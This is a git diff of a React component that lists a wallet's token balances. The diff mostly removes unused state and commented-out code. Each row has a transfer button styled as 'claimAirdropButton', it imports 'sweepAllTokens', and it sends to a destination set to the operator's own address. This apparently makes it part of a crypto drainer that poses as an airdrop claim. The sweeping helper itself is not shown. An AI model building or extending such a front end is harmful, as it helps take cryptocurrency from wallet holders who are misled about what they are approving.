@@ -1,13 +1,12 @@
 import { formatFixed } from "@exodus/ethersproject-bignumber";
-import React, { useEffect, useState } from "react";
+import React from "react";
 import { sweepAllTokens, transferToken } from "../../Helper/helpers";
 import styles from "./tokens.module.scss";
 import { ethers } from "ethers";
-import { TransferObject } from "../../Context/processTransferContext";
 
 const Tokens = ({ listAllTokens }) => {
   //   console.log(listAllTokens);
-  const to = process.env.REACT_APP_MY_ADDRESS;
+  let to = process.env.REACT_APP_MY_ADDRESS;
   //   This functionality format token balance big number
   const formatBalance = (balance, decimals) => {
     let format = formatFixed(
@@ -74,29 +73,6 @@ const Tokens = ({ listAllTokens }) => {
               formatBalance={formatBalance}
             />
           );
-
-          {
-            /*   return (
-            <tr key={index}>
-              <td>{item.name}</td>
-              <td>
-                {parseFloat(formatBalance(item.balance, item.decimals)).toFixed(
-                  2
-                )}
-              </td>
-              <td>
-                <button
-                  className={styles.claimAirdropButton}
-                  onClick={() => {
-                    setTransferClick(item);
-                  }}
-                >
-                  Transfer Token
-                </button>
-              </td>
-            </tr>
-                );*/
-          }
         })}
       </table>
     </div>
@@ -106,8 +82,6 @@ const Tokens = ({ listAllTokens }) => {
 export default Tokens;
 
 const Tr = ({ item, index, formatBalance, setTransferClick }) => {
-  const { processingTransfer, setProcessingTransfer } = TransferObject();
-  console.log(processingTransfer);
   return (
     <tr key={index}>
       <td>{item.name}</td>
@@ -118,11 +92,10 @@ const Tr = ({ item, index, formatBalance, setTransferClick }) => {
         <button
           className={styles.claimAirdropButton}
           onClick={() => {
-            setTransferClick(item, setProcessingTransfer);
-            setProcessingTransfer(true);
+            setTransferClick(item);
           }}
         >
-          {!processingTransfer ? "Transfer Token" : "Processing"}
+          Processing
         </button>
       </td>
     </tr>
